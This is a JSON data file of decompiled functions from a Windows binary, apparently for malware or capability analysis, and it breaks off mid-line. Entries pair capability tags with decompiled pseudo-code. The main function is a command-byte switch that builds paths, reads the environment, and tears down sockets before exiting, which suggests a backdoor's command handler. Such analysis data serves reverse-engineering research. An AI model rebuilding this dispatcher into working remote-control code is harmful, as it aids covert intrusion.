{
    "00401000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00401000(void)\n\n{\n    bool bVar1;\n    uint32_t uStack16;\n    \n    // [00] -r-x section size 118784 named .text\n    *0x41e7c8 = 0xffffffff;\n    fcn.00405787(0x4274a0);\n    fcn.00405787(0x4272a0);\n    bVar1 = 0 < *0x4245c8;\n    *0x42432c = 0;\n    *0x4245c8 = 0;\n    *0x424330 = 0;\n    for (uStack16 = 0; uStack16 < 0xff; uStack16 = uStack16 + 1) {\n        fcn.0041bca8(uStack16 & 0xff);\n    }\n    if (bVar1) {\n        fcn.0040b294(3000);\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "00401092": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401092(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    ulong uVar7;\n    uint uStack12;\n    \n    uStack12 = 0x40109e;\n    iVar2 = fcn.0041ce38();\n    iVar2 = -iVar2;\n    (&stack0x00000034)[iVar2] = *(&stack0x0000143c + iVar2);\n    if ((0 < *(&stack0x00001444 + iVar2)) && (*0x41e7c8 == *(&stack0x00001438 + iVar2))) {\n        *(&stack0x0000000c + iVar2) = 1;\n        *(&stack0x00000008 + iVar2) = *(&stack0x00001444 + iVar2);\n        *(&stack0x00000004 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffffc + iVar2) = 0x427280;\n        *(&stack0xfffffff8 + iVar2) = 0x4274a0;\n        *(&stack0xfffffff4 + iVar2) = 0x401103;\n        fcn.004057d1();\n    }\n    // switch table (82 cases) at 0x41e914\n    switch((&stack0x00000034)[iVar2]) {\n    case 0x97:\n        *(&stack0x00000004 + iVar2) = 0;\n        *(&stack0x00000000 + iVar2) = 0;\n        *(&stack0xfffffffc + iVar2) = (&stack0x00000034)[iVar2];\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401147;\n        fcn.00408b8f();\n        break;\n    case 0x9b:\n        *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2) + 0x20;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401174;\n        cVar1 = fcn.0040eac5();\n        if (cVar1 == '\\0') {\n            *(&stack0xfffffff8 + iVar2) = 10000;\n            *(&stack0xfffffff4 + iVar2) = 0x401324;\n            fcn.0040b294();\n            *(&stack0xfffffff8 + iVar2) = &stack0x00001438 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x401333;\n            fcn.00408d8a();\n        }\n        else {\n            *(&stack0xfffffffc + iVar2) = 0x40;\n            *(&stack0xfffffff8 + iVar2) = &stack0x00000078 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x401193;\n            fcn.0041afae();\n            *(&stack0xfffffffc + iVar2) = 0x40;\n            *(&stack0xfffffff8 + iVar2) = &stack0x00000038 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x4011a7;\n            fcn.0041af28();\n            *(&stack0xfffffffc + iVar2) = 0x200;\n            *(&stack0xfffffff8 + iVar2) = &stack0x0000017c + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x4011be;\n            fcn.0041b66a();\n            (&stack0x000003c0)[iVar2] = 0x25;\n            (&stack0x000003c1)[iVar2] = 99;\n            (&stack0x000003c2)[iVar2] = 0x25;\n            (&stack0x000003c3)[iVar2] = 0x2e;\n            (&stack0x000003c4)[iVar2] = 0x38;\n            (&stack0x000003c5)[iVar2] = 0x78;\n            (&stack0x000003c6)[iVar2] = 0x25;\n            (&stack0x000003c7)[iVar2] = 0x73;\n            (&stack0x000003c8)[iVar2] = 7;\n            (&stack0x000003c9)[iVar2] = 0x25;\n            (&stack0x000003ca)[iVar2] = 0x73;\n            (&stack0x000003cb)[iVar2] = 0x20;\n            (&stack0x000003cc)[iVar2] = 0x40;\n            (&stack0x000003cd)[iVar2] = 0x20;\n            (&stack0x000003ce)[iVar2] = 0x25;\n            (&stack0x000003cf)[iVar2] = 0x73;\n            (&stack0x000003d0)[iVar2] = 7;\n            (&stack0x000003d1)[iVar2] = 0x25;\n            (&stack0x000003d2)[iVar2] = 0x73;\n            (&stack0x000003d3)[iVar2] = 7;\n            (&stack0x000003d4)[iVar2] = 0x25;\n            (&stack0x000003d5)[iVar2] = 0x73;\n            (&stack0x000003d6)[iVar2] = 7;\n            (&stack0x000003d7)[iVar2] = 0;\n            *(&stack0x0000001c + iVar2) = 0x427244;\n            *(&stack0x00000018 + iVar2) = &stack0x0000017c + iVar2;\n            *(&stack0x00000014 + iVar2) = &stack0x00000038 + iVar2;\n            *(&stack0x00000010 + iVar2) = &stack0x00000078 + iVar2;\n            *(&stack0x0000000c + iVar2) = 0x427224;\n            *(&stack0x00000008 + iVar2) = 0x1076100;\n            *(&stack0x00000004 + iVar2) = 1;\n            *(&stack0x00000000 + iVar2) = &stack0x000003c0 + iVar2;\n            *(&stack0xfffffffc + iVar2) = 0x1000;\n            *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x4012de;\n            uVar6 = fcn.00419fa8();\n            *(&stack0x00001424 + iVar2) = uVar6;\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001424 + iVar2);\n            *(&stack0x00000000 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffffc + iVar2) = (&stack0x00000034)[iVar2];\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x401313;\n            fcn.00408b8f();\n        }\n        break;\n    case 0x9c:\n        *(&stack0xfffffff8 + iVar2) = 0x61c;\n        *(&stack0xfffffff4 + iVar2) = 0x401344;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x00001420 + iVar2) = uVar6;\n        if (*(&stack0x00001420 + iVar2) != 0) {\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001420 + iVar2);\n            *(&stack0x00000000 + iVar2) = 1;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x40138b;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001420 + iVar2) + 0x204;\n            *(&stack0x00000000 + iVar2) = 2;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4013c2;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 3;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4013f4;\n            fcn.00419a6a();\n            *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x401403;\n            uVar6 = fcn.00419d08();\n            *(*(&stack0x00001420 + iVar2) + 0x610) = uVar6;\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 4;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x401442;\n            fcn.00419a6a();\n            *(&stack0xfffffff8 + iVar2) = 0x41e8f8;\n            *(&stack0xfffffff4 + iVar2) = 0x40144e;\n            uVar6 = sub.msvcrt.dll_getenv();\n            *(&stack0xfffffff8 + iVar2) = \"%6\\\\%6.dfd\";\n            *(&stack0xfffffff4 + iVar2) = 0x40145c;\n            uVar3 = fcn.0040b60e();\n            *(&stack0x00000008 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000004 + iVar2) = uVar6;\n            *(&stack0x00000000 + iVar2) = uVar3;\n            *(&stack0xfffffffc + iVar2) = 0x204;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001420 + iVar2) + 0x408;\n            *(&stack0xfffffff4 + iVar2) = 0x40148c;\n            fcn.00419fa8();\n            *(*(&stack0x00001420 + iVar2) + 0x618) = *(&stack0x00001438 + iVar2);\n            *(*(&stack0x00001420 + iVar2) + 0x614) = 0;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x00001420 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = 0x41ca8f;\n            *(&stack0xfffffff4 + iVar2) = 0x4014c8;\n            fcn.0040b2ab();\n        }\n        break;\n    case 0x9d:\n        *(&stack0x00000000 + iVar2) = 0x1000;\n        *(&stack0xfffffffc + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4014ef;\n        fcn.0041a907();\n        *(&stack0xfffffffc + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401509;\n        fcn.0041c954();\n        break;\n    case 0x9f:\n        *(&stack0xfffffff8 + iVar2) = &stack0x00001438 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x40151d;\n        fcn.00408d8a();\n        *(&stack0xfffffff4 + iVar2) = 0x401522;\n        fcn.00401000();\n        *(&stack0xfffffff4 + iVar2) = 0x401527;\n        fcn.0040cb3e();\n        *(&stack0xfffffff4 + iVar2) = 0x40152c;\n        sub.WS2_32.dll_WSACleanup();\n        *(&stack0xfffffff8 + iVar2) = 0;\n    // WARNING: Subroutine does not return\n        *(&stack0xfffffff4 + iVar2) = 0x401538;\n        sub.KERNEL32.dll_ExitProcess();\n    case 0xa0:\n        *(&stack0xfffffff8 + iVar2) = &stack0x00001438 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x401547;\n        fcn.00408d8a();\n        *(&stack0xfffffff4 + iVar2) = 0x40154c;\n        fcn.00401000();\n        *(&stack0xfffffff8 + iVar2) = 2000;\n        *(&stack0xfffffff4 + iVar2) = 0x401558;\n        fcn.0040b294();\n        break;\n    case 0xa1:\n        *(&stack0xfffffff4 + iVar2) = 0x401562;\n        fcn.0040c9af();\n        *(&stack0xfffffff8 + iVar2) = &stack0x00001438 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x401571;\n        fcn.00408d8a();\n        *(&stack0xfffffff4 + iVar2) = 0x401576;\n        fcn.00401000();\n        *(&stack0xfffffff4 + iVar2) = 0x40157b;\n        fcn.0040cb3e();\n        *(&stack0xfffffff4 + iVar2) = 0x401580;\n        sub.WS2_32.dll_WSACleanup();\n        *(&stack0xfffffff8 + iVar2) = 0;\n    // WARNING: Subroutine does not return\n        *(&stack0xfffffff4 + iVar2) = 0x40158c;\n        sub.KERNEL32.dll_ExitProcess();\n    case 0xa2:\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = 0x427220;\n        *(&stack0xfffffff4 + iVar2) = 0x4015a3;\n        fcn.0040cfcb();\n        break;\n    case 0xa3:\n        *(&stack0xfffffff8 + iVar2) = 0x61c;\n        *(&stack0xfffffff4 + iVar2) = 0x4015b4;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x0000141c + iVar2) = uVar6;\n        if (*(&stack0x0000141c + iVar2) != 0) {\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x0000141c + iVar2);\n            *(&stack0x00000000 + iVar2) = 1;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4015fb;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x0000141c + iVar2) + 0x204;\n            *(&stack0x00000000 + iVar2) = 2;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x401632;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 3;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x401664;\n            fcn.00419a6a();\n            *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x401673;\n            uVar6 = fcn.00419d08();\n            *(*(&stack0x0000141c + iVar2) + 0x610) = uVar6;\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 4;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4016b2;\n            fcn.00419a6a();\n            *(&stack0x00000000 + iVar2) = 0x10;\n            *(&stack0xfffffffc + iVar2) = &stack0x000003b0 + iVar2;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x0000141c + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4016d4;\n            uVar6 = fcn.0041a7f6();\n            *(&stack0x00001418 + iVar2) = uVar6;\n            (&stack0x000003a7)[iVar2] = 0x25;\n            (&stack0x000003a8)[iVar2] = 0x73;\n            (&stack0x000003a9)[iVar2] = 0x5c;\n            (&stack0x000003aa)[iVar2] = 0x25;\n            (&stack0x000003ab)[iVar2] = 0x73;\n            (&stack0x000003ac)[iVar2] = 0x2e;\n            (&stack0x000003ad)[iVar2] = 0x25;\n            (&stack0x000003ae)[iVar2] = 0x73;\n            (&stack0x000003af)[iVar2] = 0;\n            (&stack0x000003a1)[iVar2] = 0x25;\n            (&stack0x000003a2)[iVar2] = 0x73;\n            (&stack0x000003a3)[iVar2] = 0x5c;\n            (&stack0x000003a4)[iVar2] = 0x25;\n            (&stack0x000003a5)[iVar2] = 0x73;\n            (&stack0x000003a6)[iVar2] = 0;\n            if (*(&stack0x00001418 + iVar2) < 1) {\n                *(&stack0xfffffff8 + iVar2) = 0x41e8f8;\n                *(&stack0xfffffff4 + iVar2) = 0x4017b9;\n                uVar6 = sub.msvcrt.dll_getenv();\n                *(&stack0x00000008 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0x00000004 + iVar2) = uVar6;\n                *(&stack0x00000000 + iVar2) = &stack0x000003a1 + iVar2;\n                *(&stack0xfffffffc + iVar2) = 0x204;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x0000141c + iVar2) + 0x408;\n                *(&stack0xfffffff4 + iVar2) = 0x4017f0;\n                fcn.00419fa8();\n            }\n            else {\n                *(&stack0xfffffff8 + iVar2) = 0x41e8f8;\n                *(&stack0xfffffff4 + iVar2) = 0x401769;\n                uVar6 = sub.msvcrt.dll_getenv();\n                *(&stack0x0000000c + iVar2) = &stack0x000003b0 + iVar2;\n                *(&stack0x00000008 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0x00000004 + iVar2) = uVar6;\n                *(&stack0x00000000 + iVar2) = &stack0x000003a7 + iVar2;\n                *(&stack0xfffffffc + iVar2) = 0x204;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x0000141c + iVar2) + 0x408;\n                *(&stack0xfffffff4 + iVar2) = 0x4017ab;\n                fcn.00419fa8();\n            }\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 5;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x401822;\n            fcn.00419a6a();\n            *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x401831;\n            iVar5 = fcn.00419d08();\n            *(*(&stack0x0000141c + iVar2) + 0x60c) = iVar5 != 0;\n            *(*(&stack0x0000141c + iVar2) + 0x618) = 0;\n            *(*(&stack0x0000141c + iVar2) + 0x614) = 0;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x0000141c + iVar2);\n            *(&stack0xfffffff8 + iVar2) = fcn.0040d2de;\n            *(&stack0xfffffff4 + iVar2) = 0x40187c;\n            fcn.0040b2ab();\n        }\n        break;\n    case 0xa4:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401891;\n        fcn.00409508();\n        break;\n    case 0xa6:\n        *(&stack0x00000384 + iVar2) = *(&stack0x00001438 + iVar2);\n        (&stack0x00000381)[iVar2] = 0xa7;\n        (&stack0x00000380)[iVar2] = 0xa6;\n        (&stack0x00000388)[iVar2] = 0;\n        *(&stack0x00000000 + iVar2) = 0x204;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x4018de;\n        fcn.00419918();\n        *(&stack0xfffffff8 + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x4018ed;\n        fcn.004095ed();\n        break;\n    case 0xa8:\n        *(&stack0xfffffff8 + iVar2) = 0x314;\n        *(&stack0xfffffff4 + iVar2) = 0x402221;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x000013f8 + iVar2) = uVar6;\n        if (*(&stack0x000013f8 + iVar2) != 0) {\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x000013f8 + iVar2);\n            *(&stack0x00000000 + iVar2) = 1;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x402268;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x104;\n            *(&stack0x00000004 + iVar2) = *(&stack0x000013f8 + iVar2) + 0x204;\n            *(&stack0x00000000 + iVar2) = 2;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x40229f;\n            fcn.00419a6a();\n            *(*(&stack0x000013f8 + iVar2) + 0x308) = 0;\n            *(*(&stack0x000013f8 + iVar2) + 0x30c) = *(&stack0x00001438 + iVar2);\n            *(*(&stack0x000013f8 + iVar2) + 0x310) = 1;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x000013f8 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = fcn.00409abc;\n            *(&stack0xfffffff4 + iVar2) = 0x4022e9;\n            *0x42432c = fcn.0040b2ab();\n        }\n        break;\n    case 0xaa:\n        *0x42432c = 0;\n        break;\n    case 0xab:\n        *(&stack0xfffffff8 + iVar2) = 0x230;\n        *(&stack0xfffffff4 + iVar2) = 0x4018ff;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x00001414 + iVar2) = uVar6;\n        if (*(&stack0x00001414 + iVar2) != 0) {\n            *(&stack0x00001410 + iVar2) = **(&stack0x00001440 + iVar2);\n            *(&stack0x00001440 + iVar2) = *(&stack0x00001440 + iVar2) + 1;\n            *(*(&stack0x00001414 + iVar2) + 0x204) = 0;\n            *(*(&stack0x00001414 + iVar2) + 0x20c) = 0xab;\n            *(*(&stack0x00001414 + iVar2) + 0x20d) = 0xac;\n            *(*(&stack0x00001414 + iVar2) + 0x20e) = 0xad;\n            *(*(&stack0x00001414 + iVar2) + 0x208) = *(&stack0x00001410 + iVar2);\n            *(*(&stack0x00001414 + iVar2) + 0x210) = *(&stack0x00001438 + iVar2);\n            *(*(&stack0x00001414 + iVar2) + 0x228) = **(&stack0x00001440 + iVar2);\n            *(&stack0x00001440 + iVar2) = *(&stack0x00001440 + iVar2) + 1;\n            if (*(&stack0x00001410 + iVar2) == 0) {\n                *(&stack0x00000008 + iVar2) = 0x204;\n                *(&stack0x00000004 + iVar2) = *(&stack0x00001414 + iVar2);\n                *(&stack0x00000000 + iVar2) = 1;\n                *(&stack0xfffffffc + iVar2) = 7;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n                *(&stack0xfffffff4 + iVar2) = 0x401add;\n                fcn.00419a6a();\n                *(&stack0x00000008 + iVar2) = 0x1000;\n                *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0x00000000 + iVar2) = 2;\n                *(&stack0xfffffffc + iVar2) = 7;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n                *(&stack0xfffffff4 + iVar2) = 0x401b0f;\n                fcn.00419a6a();\n                *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0xfffffff4 + iVar2) = 0x401b1e;\n                uVar7 = fcn.00419dc2();\n                iVar5 = *(&stack0x00001414 + iVar2);\n                *(iVar5 + 0x220) = uVar7;\n                *(iVar5 + 0x224) = uVar7 >> 0x20;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x00001414 + iVar2);\n                *(&stack0xfffffff4 + iVar2) = 0x401b40;\n                uVar7 = fcn.0040ac70();\n                iVar5 = *(&stack0x00001414 + iVar2);\n                *(iVar5 + 0x218) = uVar7;\n                *(iVar5 + 0x21c) = uVar7 >> 0x20;\n            }\n            else if (*(&stack0x00001410 + iVar2) == 1) {\n                *(&stack0x00000008 + iVar2) = 0x1000;\n                *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0x00000000 + iVar2) = 1;\n                *(&stack0xfffffffc + iVar2) = 7;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n                *(&stack0xfffffff4 + iVar2) = 0x4019fe;\n                fcn.00419a6a();\n                *(&stack0x00000000 + iVar2) = 0x204;\n                *(&stack0xfffffffc + iVar2) = *(&stack0x00001414 + iVar2);\n                *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0xfffffff4 + iVar2) = 0x401a20;\n                fcn.0041a907();\n                *(&stack0x00000000 + iVar2) = 0x204;\n                *(&stack0xfffffffc + iVar2) = &stack0x0000017c + iVar2;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x00001414 + iVar2);\n                *(&stack0xfffffff4 + iVar2) = 0x401a42;\n                fcn.0041a682();\n                *(&stack0xfffffff8 + iVar2) = &stack0x0000017c + iVar2;\n                *(&stack0xfffffff4 + iVar2) = 0x401a51;\n                fcn.0040ace1();\n                *(&stack0x00000008 + iVar2) = 0x1000;\n                *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0x00000000 + iVar2) = 2;\n                *(&stack0xfffffffc + iVar2) = 7;\n                *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n                *(&stack0xfffffff4 + iVar2) = 0x401a83;\n                fcn.00419a6a();\n                *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n                *(&stack0xfffffff4 + iVar2) = 0x401a92;\n                uVar7 = fcn.00419dc2();\n                iVar5 = *(&stack0x00001414 + iVar2);\n                *(iVar5 + 0x220) = uVar7;\n                *(iVar5 + 0x224) = uVar7 >> 0x20;\n            }\n            *(&stack0xfffffffc + iVar2) = *(&stack0x00001414 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = 0x41c150;\n            *(&stack0xfffffff4 + iVar2) = 0x401b6b;\n            fcn.0040b2ab();\n        }\n        break;\n    case 0xac:\n        *(&stack0x00000000 + iVar2) = *(&stack0x00001444 + iVar2);\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401b95;\n        fcn.0041c8b6();\n        break;\n    case 0xad:\n        *(&stack0xfffffff8 + iVar2) = **(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401baf;\n        fcn.0041bca8();\n        break;\n    case 0xae:\n        *(&stack0xfffffff8 + iVar2) = 0x40a;\n        *(&stack0xfffffff4 + iVar2) = 0x401eea;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x000013fc + iVar2) = uVar6;\n        if (*(&stack0x000013fc + iVar2) != 0) {\n            *(*(&stack0x000013fc + iVar2) + 0x408) = *(*(&stack0x00001440 + iVar2) + 1) == '\\x01';\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x000013fc + iVar2);\n            *(&stack0x00000000 + iVar2) = 1;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2) + 2;\n            *(&stack0xfffffff4 + iVar2) = 0x401f53;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x000013fc + iVar2) + 0x204;\n            *(&stack0x00000000 + iVar2) = 2;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2) + 2;\n            *(&stack0xfffffff4 + iVar2) = 0x401f8e;\n            fcn.00419a6a();\n            *(*(&stack0x000013fc + iVar2) + 0x409) = 1;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x000013fc + iVar2);\n            *(&stack0xfffffff8 + iVar2) = 0x40ac05;\n            *(&stack0xfffffff4 + iVar2) = 0x401fb3;\n            fcn.0040b2ab();\n        }\n        break;\n    case 0xaf:\n        *(&stack0x00000008 + iVar2) = 0x1000;\n        *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0x00000000 + iVar2) = 1;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401fea;\n        fcn.00419a6a();\n        *(&stack0x00000008 + iVar2) = 0x104;\n        *(&stack0x00000004 + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0x00000000 + iVar2) = 2;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x40201c;\n        fcn.00419a6a();\n        *(&stack0x00000008 + iVar2) = 0x40;\n        *(&stack0x00000004 + iVar2) = &stack0x00000078 + iVar2;\n        *(&stack0x00000000 + iVar2) = 3;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x40204e;\n        fcn.00419a6a();\n        *(&stack0xfffffff8 + iVar2) = &stack0x00000078 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x40205d;\n        uVar6 = fcn.00419d08();\n        *(&stack0x00000000 + iVar2) = uVar6;\n        *(&stack0xfffffffc + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x40207b;\n        fcn.0040a8af();\n        break;\n    case 0xb0:\n        *(&stack0x00000008 + iVar2) = 0x1000;\n        *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0x00000000 + iVar2) = 1;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4020b3;\n        fcn.00419a6a();\n        *(&stack0x00000008 + iVar2) = 0x104;\n        *(&stack0x00000004 + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0x00000000 + iVar2) = 2;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4020e5;\n        fcn.00419a6a();\n        *(&stack0xfffffffc + iVar2) = &stack0x0000017c + 